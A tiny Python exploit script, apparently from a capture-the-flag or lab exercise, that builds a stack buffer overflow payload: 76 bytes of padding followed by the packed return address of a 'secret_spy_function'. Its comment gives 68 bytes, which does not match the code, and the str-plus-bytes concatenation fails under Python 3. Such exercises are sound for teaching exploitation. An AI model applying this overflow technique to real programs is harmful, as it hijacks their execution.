import struct

# 68 bytes to fill the buffer and saved EBP
payload = 'A' * 76
# Address of secret_spy_function (Little-endian format)
payload += struct.pack('<I', 0x565561f4)
#0x565561bd
print(payload)
